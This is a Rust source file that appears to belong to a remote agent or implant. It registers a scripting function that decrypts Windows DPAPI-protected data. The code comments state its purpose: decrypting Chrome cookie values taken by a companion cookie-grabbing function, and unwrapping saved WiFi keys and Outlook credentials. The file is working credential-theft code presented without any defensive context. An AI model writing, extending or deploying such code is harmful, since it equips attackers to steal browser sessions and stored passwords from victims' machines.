// src/agent/scripting/dpapi.rs
use rhai::Engine;

pub fn register(engine: &mut Engine) {
    // Decrypt a DPAPI-protected blob (Windows only).
    //
    // blob_hex    — hex-encoded ciphertext (the pb/cb pair from CryptProtectData)
    // entropy_hex — optional hex-encoded entropy; pass "" when none was used
    //
    // Returns hex-encoded plaintext on success.
    // Use this after internal_chrome_cookies to decrypt the encrypted_value field,
    // or to unwrap WiFi PSKs, Outlook credentials, and similar DPAPI-protected material.
    engine.register_fn("internal_dpapi_decrypt", |blob_hex: &str, entropy_hex: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            let mut data = match hex::decode(blob_hex) {
                Ok(d)  => d,
                Err(e) => return format!("Error: {}", e),
            };
            let mut entropy = if !entropy_hex.is_empty() {
                match hex::decode(entropy_hex) {
                    Ok(d)  => d,
                    Err(e) => return format!("Error: {}", e),
                }
            } else {
                Vec::new()
            };
            unsafe {
                use super::win_ffi::win_ext::*;
                let blob_in = DataBlob { cb: data.len() as DWORD, pb: data.as_mut_ptr() };
                let entropy_blob = if entropy.is_empty() { None } else {
                    Some(DataBlob { cb: entropy.len() as DWORD, pb: entropy.as_mut_ptr() })
                };
                let mut blob_out = DataBlob { cb: 0, pb: std::ptr::null_mut() };
                let ok = CryptUnprotectData(
                    &blob_in,
                    std::ptr::null_mut(),
                    entropy_blob.as_ref()
                        .map(|b| b as *const DataBlob)
                        .unwrap_or(std::ptr::null()),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    0,
                    &mut blob_out,
                );
                if ok == 0 {
                    return format!("Error: CryptUnprotectData failed ({})", GetLastError());
                }
                let plaintext = std::slice::from_raw_parts(blob_out.pb, blob_out.cb as usize).to_vec();
                LocalFree(blob_out.pb as *mut std::ffi::c_void);
                hex::encode(plaintext)
            }
        }
        #[cfg(not(target_os = "windows"))]
        "Error: DPAPI is Windows only".to_string()
    });
}
